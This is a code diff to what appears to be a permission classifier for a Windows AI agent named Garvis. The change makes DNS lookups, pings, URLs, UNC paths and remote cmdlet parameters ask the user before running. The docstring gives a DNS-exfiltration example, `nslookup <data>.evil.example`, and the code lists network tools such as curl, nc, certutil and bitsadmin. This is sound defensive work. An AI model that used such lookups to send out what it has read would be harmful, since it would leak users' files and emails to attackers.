@@ -6,8 +6,15 @@ blocks and sub-expressions -- plus .NET method calls, file redirections
 and property assignments. A command runs without confirmation only when
 EVERYTHING in it is known to be read-only: cmdlets like Get-*/Select-*/
 Where-*, and a short list of external tools with read-only arguments
-(git status/log/diff, ipconfig, ping, ...). Test runners (pytest, npm test,
+(git status/log/diff, ipconfig, ...). Test runners (pytest, npm test,
 dotnet test, ...) always ask: a test suite runs the project's own code.
+
+Read-only is not the same as harmless when the network is involved: a
+lookup or ping sends its target name out, so `nslookup <data>.evil.example`
+can carry text the agent just read (a file, an email) to whoever runs that
+DNS zone. Commands that contact another computer -- lookups/pings to any
+host except loopback and a few fixed public landmarks, remote parameters
+(-ComputerName, /s), UNC paths and URLs, web/transfer tools -- ask first.
 
 Anything else -- unknown programs, writes, deletes, process/service
 changes, installs, network uploads, dynamic code, parse errors, or any
@@ -17,6 +24,7 @@ nothing is ever silently blocked or silently allowed by the LLM.
 """
 from __future__ import annotations
 
+import ipaddress
 import re
 from collections.abc import Callable
 from dataclasses import dataclass, field
@@ -37,6 +45,7 @@ _ALIASES = {
     "diff": "compare-object", "compare": "compare-object", "gi": "get-item", "gp": "get-itemproperty",
     "rvpa": "resolve-path", "cls": "clear-host", "clear": "clear-host", "pushd": "push-location",
     "popd": "pop-location", "gdr": "get-psdrive", "gjb": "get-job", "help": "get-help", "man": "get-help",
+    "tnc": "test-netconnection",
 }
 _SAFE_VERB_PREFIXES = (
     "get-", "test-", "measure-", "select-", "where-", "sort-", "group-", "format-", "convertto-",
@@ -163,24 +172,207 @@ def _flags_in(allowed: set[str]) -> Callable[[list[str]], bool]:
     return lambda args: all(_strip(a).lower() in allowed for a in args)
 
 
+def _netsh(args: list[str]) -> bool:
+    # `show` only, run locally: -r/-u/-p target a remote computer, -f/-a run a
+    # script or alias file, and `exec` runs a script.
+    words = [_strip(a).lower() for a in args]
+    return "show" in words and words[:1] != ["exec"] and not any(w.startswith("-") for w in words)
+
+
+_NVIDIA_VALUE = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9_,:.\-]*$")
+_NVIDIA_VALUED = ("--display=", "--id=", "--query-gpu=", "--format=")
+
+
+def _nvidia_smi(args: list[str]) -> bool:
+    """Queries only: no args, -L/--list-gpus, -q/--query [-d TYPES] [-i GPU],
+    --query-gpu=... [--format=...] [-i GPU], -h/--help. Everything else asks:
+    -f writes a file, -pl/-r/-pm/-e/-c/-ac/-lgc/-mig... change the GPU, and
+    -l loops. Case matters (-L lists GPUs, -l loops)."""
+    tokens = [_strip(a) for a in args]
+    i = 0
+    while i < len(tokens):
+        token = tokens[i]
+        i += 1
+        if token in ("-L", "--list-gpus", "-q", "--query", "-h", "--help"):
+            continue
+        if token in ("-d", "-i"):
+            value = tokens[i] if i < len(tokens) else ""
+            i += 1
+        else:
+            prefix = next((p for p in _NVIDIA_VALUED if token.startswith(p)), None)
+            if prefix is None:
+                return False
+            value = token[len(prefix):]
+        if not _NVIDIA_VALUE.match(value):
+            return False
+    return True
+
+
+def _no_remote(args: list[str]) -> bool:
+    # systeminfo/tasklist/getmac/driverquery /s <computer> query another PC.
+    return not any(_strip(a).lower() in ("/s", "-s", "/u", "-u", "/p", "-p") for a in args)
+
+
 _EXTERNAL_RULES: dict[str, Callable[[list[str]], bool]] = {
     "git": _git,
     "python": _python, "python3": _python, "py": _python,
     "pip": _subcommand_in({"list", "show", "freeze", "check"}),
-    "npm": _subcommand_in({"ls", "list", "outdated", "view"}),
+    # `npm view/outdated` and `winget search/show` send the (model-chosen)
+    # package name or query to an online registry; they ask like any other.
+    "npm": _subcommand_in({"ls", "list"}),
     "node": _flags_in({"--version", "-v"}),
     "dotnet": lambda args: [_strip(a).lower() for a in args][:1] in (["--info"], ["--version"], ["--list-sdks"]),
-    "winget": _subcommand_in({"list", "search", "show"}),
+    "winget": _subcommand_in({"list"}),
     "ipconfig": _flags_in({"/all", "/displaydns"}),
     "sc": _subcommand_in({"query", "queryex", "qc", "qdescription"}),
     "reg": _subcommand_in({"query"}),
     "powercfg": _flags_in({"/list", "/l", "/query", "/q", "/a", "/availablesleepstates", "/getactivescheme"}),
-    "netsh": lambda args: "show" in [_strip(a).lower() for a in args],
+    "netsh": _netsh,
+    "nvidia-smi": _nvidia_smi,
+    "arp": _flags_in({"-a", "/a", "-g", "/g", "-v", "/v"}),  # -s/-d change the ARP cache
+    **{name: _no_remote for name in ("systeminfo", "tasklist", "getmac", "driverquery")},
     **{name: (lambda args: True) for name in (
-        "systeminfo", "tasklist", "whoami", "hostname", "where", "nslookup", "ping", "tracert", "pathping",
-        "netstat", "getmac", "driverquery", "nvidia-smi", "findstr", "fc", "tree", "ver", "arp",
+        "whoami", "hostname", "where", "netstat", "findstr", "fc", "tree", "ver",
     )},
 }
+
+
+# ------------------------------------------------------------------ network
+# Lookups and pings run unasked only against loopback or one of these fixed
+# public hosts. Their names carry no data, and the operators of these
+# addresses aren't an attacker, so nothing the agent read can reach an
+# attacker this way (packet size/count could encode bits, but only Google,
+# Cloudflare, Quad9, OpenDNS or Microsoft would see them). Private LAN
+# addresses are NOT exempt: on shared Wi-Fi another device can own one.
+_BENIGN_HOSTS = frozenset({
+    "localhost",
+    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "149.112.112.112", "208.67.222.222",
+    "208.67.220.220", "2001:4860:4860::8888", "2001:4860:4860::8844", "2606:4700:4700::1111",
+    "google.com", "www.google.com", "dns.google", "cloudflare.com", "www.cloudflare.com",
+    "one.one.one.one", "microsoft.com", "www.microsoft.com", "bing.com", "www.bing.com",
+    "www.msftconnecttest.com", "github.com",
+})
+_OPTION_VALUE = re.compile(r"^[A-Za-z0-9]{1,16}$")
+
+
+def _benign_host(token: str) -> bool:
+    host = _strip(token).lower().rstrip(".")
+    if host.startswith("[") and host.endswith("]"):
+        host = host[1:-1]
+    if host in _BENIGN_HOSTS:
+        return True
+    try:
+        return ipaddress.ip_address(host).is_loopback
+    except ValueError:
+        return False
+
+
+@dataclass(frozen=True)
+class _NetworkTool:
+    switches: frozenset[str] = frozenset()
+    """Options without a value."""
+    valued: frozenset[str] = frozenset()
+    """Options followed by a short word or number (count, timeout, record type)."""
+    host_options: frozenset[str] = frozenset()
+    """Options followed by a host (which must be benign)."""
+    inline: frozenset[str] = frozenset()
+    """nslookup-style `-name=value` options."""
+
+    def reason(self, display: str, args: list[str]) -> str | None:
+        hosts: list[str] = []
+        tokens = [_strip(a) for a in args]
+        i = 0
+        while i < len(tokens):
+            token = tokens[i]
+            i += 1
+            if len(token) > 1 and token[0] in "-/":
+                option, colon, value = ("-" + token[1:].lower()).partition(":")  # PowerShell -Name:value
+                name, equals, inline_value = option.partition("=")
+                if equals and name in self.inline and _OPTION_VALUE.match(inline_value):
+                    continue
+                if not equals and not colon and option in self.switches:
+                    continue
+                if not equals and (option in self.valued or option in self.host_options):
+                    if not colon:
+                        value = tokens[i] if i < len(tokens) else ""
+                        i += 1
+                    if option in self.host_options:
+                        hosts.extend(value.split(","))
+                        continue
+                    if _OPTION_VALUE.match(_strip(value)):
+                        continue
+                return (f"'{display}' with the option '{token[:40]}' may send data over the network, "
+                        "and Garvis can't check that option.")
+            hosts.extend(token.split(","))
+        if not hosts:
+            return (f"'{display}' doesn't name a fixed target here, so it may contact a host chosen at "
+                    "runtime (e.g. from piped input).")
+        for host in hosts:
+            if not _benign_host(host):
+                return (f"'{display}' would contact '{_strip(host)[:60]}'. Lookups and pings send the target "
+                        "name over the network, which can carry data to whoever runs that host, so Garvis "
+                        "asks first (only localhost and a few well-known public hosts are exempt).")
+        return None
+
+
+_NETWORK_TOOLS: dict[str, _NetworkTool] = {
+    "ping": _NetworkTool(switches=frozenset({"-t", "-a", "-f", "-4", "-6"}),
+                         valued=frozenset({"-n", "-l", "-i", "-v", "-r", "-s", "-w"})),
+    "tracert": _NetworkTool(switches=frozenset({"-d", "-4", "-6"}), valued=frozenset({"-h", "-w"})),
+    "pathping": _NetworkTool(switches=frozenset({"-n", "-4", "-6"}), valued=frozenset({"-h", "-p", "-q", "-w"})),
+    "nslookup": _NetworkTool(
+        switches=frozenset({"-debug", "-nodebug", "-d2", "-nod2", "-recurse", "-norecurse", "-vc", "-novc"}),
+        inline=frozenset({"-type", "-querytype", "-q", "-class", "-timeout", "-retry", "-port"}),
+    ),
+    "resolve-dnsname": _NetworkTool(
+        switches=frozenset({"-dnsonly", "-cacheonly", "-nohostsfile", "-quicktimeout", "-tcponly", "-noidn",
+                            "-norecursion", "-dnssecok", "-dnsseccd", "-llmnronly", "-llmnrfallback",
+                            "-llmnrnetbiosonly", "-netbiosfallback"}),
+        valued=frozenset({"-type"}), host_options=frozenset({"-name", "-server"}),
+    ),
+    "test-connection": _NetworkTool(
+        switches=frozenset({"-quiet", "-ipv4", "-ipv6", "-resolvedestination", "-traceroute", "-ping",
+                            "-repeat", "-mtusize", "-dontfragment"}),
+        valued=frozenset({"-count", "-buffersize", "-delay", "-timetolive", "-ttl", "-maxhops",
+                          "-timeoutseconds", "-throttlelimit"}),
+        host_options=frozenset({"-computername", "-cn", "-targetname"}),
+    ),
+    "test-netconnection": _NetworkTool(
+        switches=frozenset({"-traceroute"}), valued=frozenset({"-port", "-commontcpport", "-informationlevel", "-hops"}),
+        host_options=frozenset({"-computername", "-cn", "-remoteaddress"}),
+    ),
+}
+_NETWORK_PROGRAMS = frozenset({
+    "invoke-webrequest", "iwr", "invoke-restmethod", "irm", "curl", "wget", "start-bitstransfer", "bitsadmin",
+    "certutil", "send-mailmessage", "ftp", "tftp", "telnet", "ssh", "scp", "sftp", "nc", "ncat",
+    "test-wsman", "test-computersecurechannel", "find-module", "find-script", "find-package", "find-command",
+    "find-dscresource", "find-rolecapability", "find-packageprovider",
+})
+"""Programs/cmdlets whose job is talking to another computer. They would ask
+anyway (not read-only); listed so the reason says why."""
+_REMOTE_PARAMETERS = ("-computername", "-cn", "-cimsession", "-session", "-server", "-connectionuri")
+"""Cmdlet parameters that make an otherwise local Get-*/Test-* cmdlet contact
+another computer. PowerShell accepts any unambiguous prefix (-Comp, -C), so
+a parameter matches when it is a prefix of one of these."""
+_NETWORK_PATH = re.compile(
+    r"[a-z][a-z0-9+.\-]*://"
+    r"|(?:^|(?<=[\s'\"(=,;{|@])|(?<=::)|(?<=\w\w:))"
+    r"[\\/]{2}(?:[.?][\\/](?![a-z]:)|(?![.?][\\/])[^\\/\s'\"])",
+    re.IGNORECASE,
+)
+"""Any URL, and a path starting `\\\\server\\share`, `//host/x` or `\\\\?\\UNC\\...`
+(also as `-Path:\\\\host` or `FileSystem::\\\\host`): even reading such a path
+resolves and contacts that host. Local device paths (`\\\\?\\C:`, `\\\\.\\C:`)
+and a doubled backslash inside a path (`C:\\\\Users`) don't match."""
+_SPLAT = re.compile(r"^@[\w?:]")
+
+
+def _remote_parameter(args: list[str]) -> str | None:
+    for arg in args:
+        token = arg.strip().lower().partition(":")[0]
+        if len(token) > 1 and token.startswith("-") and any(p.startswith(token) for p in _REMOTE_PARAMETERS):
+            return arg.strip()
+    return None
 
 
 @dataclass
@@ -268,6 +460,9 @@ def classify(command: str, analysis: CommandAnalysis) -> str | None:
                 return f"It touches a credential file: {reason}"
     if analysis.parse_errors:
         return "Garvis couldn't fully parse this command."
+    if _NETWORK_PATH.search(command):
+        return ("It refers to a network path or web address (\\\\server\\..., //host, http://...); even "
+                "reading one contacts that host and can carry data to it.")
     if analysis.redirections:
         return "It writes output to a file (redirection)."
     if analysis.member_assignments:
@@ -294,9 +489,24 @@ def classify(command: str, analysis: CommandAnalysis) -> str | None:
             return "ForEach-Object with a member name calls a method on every item, which may change something."
         # The read-only rules trust a tool by name; a copy run from a path (.\ping.exe,
         # C:\Users\...\Downloads\whoami.exe) could be any program.
-        if ("\\" in name or "/" in name) and _normalize_name(name) in _EXTERNAL_RULES:
+        normalized = _normalize_name(name)
+        if ("\\" in name or "/" in name) and (normalized in _EXTERNAL_RULES or normalized in _NETWORK_TOOLS):
             return f"It runs '{parsed.name}' from a path, which may not be the Windows tool of that name."
-        rule = _EXTERNAL_RULES.get(_normalize_name(name))
+        if any(_SPLAT.match(a.strip()) for a in parsed.args):
+            return f"'{parsed.name}' gets its parameters by splatting, which Garvis can't check."
+        if normalized in _NETWORK_PROGRAMS:
+            return f"'{parsed.name}' talks to another computer, which can carry data off this PC."
+        network = _NETWORK_TOOLS.get(normalized)
+        if network is not None:
+            reason = network.reason(parsed.name, parsed.args)
+            if reason:
+                return reason
+            continue
+        if "-" in name and normalized not in _EXTERNAL_RULES:  # cmdlets, not tools like nvidia-smi
+            remote = _remote_parameter(parsed.args)
+            if remote:
+                return f"'{parsed.name} {remote}' contacts another computer."
+        rule = _EXTERNAL_RULES.get(normalized)
         if rule is not None:
             if not rule(parsed.args):
                 return f"'{parsed.name} {' '.join(parsed.args)[:60]}' may change something."
